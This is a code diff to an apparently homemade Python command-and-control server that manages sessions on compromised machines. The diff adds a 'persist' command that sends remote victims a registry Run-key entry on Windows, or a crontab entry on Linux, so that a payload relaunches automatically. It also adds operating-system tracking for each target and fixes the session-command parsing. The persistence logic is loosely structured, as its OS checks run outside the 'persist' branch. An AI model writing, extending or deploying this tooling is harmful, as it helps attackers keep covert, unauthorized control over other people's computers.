@@ -16,7 +16,7 @@ def banner():
     print('  / ___ |/ /_/ / /_/ / / / /_/ /  / /___ / __/    ')
     print(' /_/  |_/ .___/\____/_/_/\____/   \____//____/    ')
     print('       /_/                                        ')
-    print('                                  By Luka Babetzki')
+    print('                                        By adver5e')
 
 
 def comm_in(targ_id):
@@ -28,7 +28,7 @@ def comm_out(targ_id, message):
     message = str(message)
     targ_id.send(message.encode())
 
-def target_comm(targ_id):
+def target_comm(targ_id, targets, num):
     while True:
         message = input('send message#>')
         comm_out(targ_id, message)
@@ -38,6 +38,18 @@ def target_comm(targ_id):
             break
         if message == 'background':
             break
+        if message == 'persist':
+            payload_name = input('[+] Enter the name of the payload to add to autorun: ')
+        if targets[num][6] == 1:
+            persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
+            targ_id.send(persist_command_1.encode())
+            persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
+            targ_id.send(persist_command_2.encode())
+            print('[+] Run this command to clean up the registry: \nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v screendoor /f')
+        if targets[num][6] == 2:
+            persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
+            targ_id.send(persist_command.encode())
+            print('[+] Run this command to clean up the crontab: \ncrontab -r')
         else:
             response = comm_in(targ_id)
             if response == 'exit':
@@ -61,22 +73,27 @@ def comm_handler(remote_target, remote_ip):
             remote_target, remote_ip = sock.accept()
             username = remote_target.recv(1024).decode()
             admin = remote_target.recv(1024).decode()
+            op_sys = remote_target.recv(1024).decode()
             if admin == 1:
                 admin_val = 'Yes'
             elif username =='root':
                 admin_val = 'Yes'
             else:
                 admin_val = 'No'
+            if 'Windows' in op_sys:
+                pay_val = 1
+            else:
+                pay_val = 2
             cur_time = time.strftime("%H:%M:%S", time.localtime())
             date = datetime.now()
             time_record = (f"{date.month}/{date.day}/{date.year}/{cur_time}")
             host_name = socket.gethostbyaddr(remote_ip[0])
             if host_name is not None:
-                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val])
+                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val, op_sys, pay_val])
                 print(
                     f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#>', end="")
             else:
-                targets.append([remote_target, remote_ip[0], time_record])
+                targets.append([remote_target, remote_ip[0], time_record, username, admin_val, op_sys, pay_val])
                 print(
                     f'\n[+] Connection received from {remote_ip[0]}\n'+'Enter command#>', end="")
         except:
@@ -183,20 +200,20 @@ if __name__ == '__main__':
                     exeplant()
                 else:
                     print('[-] You cannot generate a payload without an active listener.')
-            if command.split("")[0] == 'sessions':
+            if command.split(" ")[0] == 'sessions':
                 session_counter = 0
-                if command.split("")[1] == '-l':
+                if command.split(" ")[1] == '-l':
                     myTable = PrettyTable()
-                    myTable.field_names = ['Session','Status','Username','Admin','Target','Check-In Time']
+                    myTable.field_names = ['Session','Status','Username','Admin','Target','Operating System','Check-In Time']
                     myTable.padding_width = 3
                     for target in targets:
-                        myTable.add_row([session_counter, 'Placeholder', target[3], target[4], target[1], target[2]])
+                        myTable.add_row([session_counter, 'Placeholder', target[3], target[4], target[1], target[5], target[2]])
                         session_counter +=1
                     print(myTable)
-                if command.split("")[1]=='-i':
-                    num = int(command.split("")[2])
+                if command.split(" ")[1] =='-i':
+                    num = int(command.split(" ")[2])
                     targ_id = (targets[num])[0]
-                    target_comm(targ_id)
+                    target_comm(targ_id, targets, num)
         except KeyboardInterrupt:
             print('\n[+] Keyboard interrupt issued. Exiting...')
             kill_flag = 1
